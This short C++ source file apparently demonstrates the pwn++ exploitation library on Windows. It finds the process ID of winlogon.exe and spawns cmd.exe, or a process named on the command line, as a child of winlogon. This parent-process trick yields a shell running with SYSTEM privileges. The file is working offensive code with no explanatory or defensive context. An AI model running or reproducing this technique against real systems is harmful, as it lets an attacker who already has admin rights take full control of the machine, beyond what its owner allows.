#include <pwn.hpp>

namespace ctx = pwn::context;


auto wmain(_In_ int argc, _In_ const wchar_t** argv) -> int
{
    ctx::set_architecture(ctx::architecture_t::x64);
    ctx::set_log_level(pwn::log::log_level_t::LOG_DEBUG);

    wchar_t* const target_process = (argc >= 2) ? argv[1] : L"cmd.exe";

    auto ppid = pwn::win::system::pidof(L"winlogon.exe");
    if(ppid)
    {
        info(L"found winlogon pid=%lu\n", ppid);
        std::optional<HANDLE> hProcess = pwn::win::process::execv(target_process, ppid.value());
        if (hProcess)
        {
            auto h = pwn::utils::GenericHandle(hProcess.value());
            ::WaitForSingleObject(h.get(), INFINITE);
        }
    }
    return 0;
}